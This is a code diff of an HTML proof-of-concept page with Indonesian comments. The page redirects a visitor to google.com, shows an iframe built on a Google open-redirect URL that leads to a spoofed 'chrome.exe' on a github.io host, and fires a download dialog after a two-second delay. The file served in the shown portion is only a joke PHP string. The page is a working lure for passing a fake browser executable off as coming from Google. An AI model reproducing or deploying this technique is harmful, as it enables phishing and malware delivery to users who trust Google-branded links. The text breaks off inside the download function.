@@ -3,15 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PoC with Iframe and Button</title>
+  <title>PoC - Download Dialog After Google</title>
 </head>
 <body>
   <div id="content">
-    <h1>Step 2: Redirect to Google</h1>
-    <p>Klik tombol di bawah untuk mengunjungi <b>Google.com</b> dan menampilkan iframe dengan URL yang ditentukan:</p>
-
-    <!-- Button untuk ke Google -->
+    <h1>Step 1: Klik untuk pergi ke Google.com</h1>
+    <p>Klik tombol di bawah untuk mengunjungi <b>Google.com</b> dan setelahnya, dialog download akan muncul:</p>
+    
+    <!-- Tombol untuk mengarahkan ke Google.com -->
     <button onclick="redirectToGoogle()">Go to Google.com</button>
+
+    <!-- Iframe (akan muncul setelah redirect) -->
+    <div style="margin-top: 20px;">
+      <iframe 
+        id="iframeExample" 
+        src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
+        width="600" 
+        height="300" 
+        style="border: 1px solid #ccc; display: none;">
+      </iframe>
+    </div>
   </div>
 
   <script>
@@ -19,23 +30,19 @@
       // Redirect ke Google.com di tab yang sama
       window.location.href = "https://www.google.com";
 
-      // Tunggu beberapa detik agar halaman benar-benar di-load, baru tampilkan iframe dan download
+      // Tunggu 2 detik setelah pengalihan, baru muncul iframe dan trigger download
       setTimeout(function() {
-        // Iframe baru akan ditampilkan setelah beberapa detik
-        const iframe = document.createElement("iframe");
-        iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL";
-        iframe.width = "600";
-        iframe.height = "300";
-        iframe.style.border = "1px solid #ccc";
-        document.body.appendChild(iframe);  // Menambahkan iframe ke body
+        // Tampilkan iframe setelah pengalihan ke Google
+        const iframe = document.getElementById('iframeExample');
+        iframe.style.display = "block";  // Menampilkan iframe
         
-        // Simulasi dialog download setelah iframe dimunculkan
+        // Trigger dialog download
         triggerDownload();
-      }, 2000);  // Delay 2 detik setelah redirect untuk memastikan halaman di-load
+      }, 2000);  // Delay 2 detik setelah redirect ke Google.com
     }
 
     function triggerDownload() {
-      // Buat file PHP yang akan didownload
+      // File PHP yang akan diunduh
       const php = `<?php
 echo "wkwkwk ini file php bebas 😁";
 ?>`;
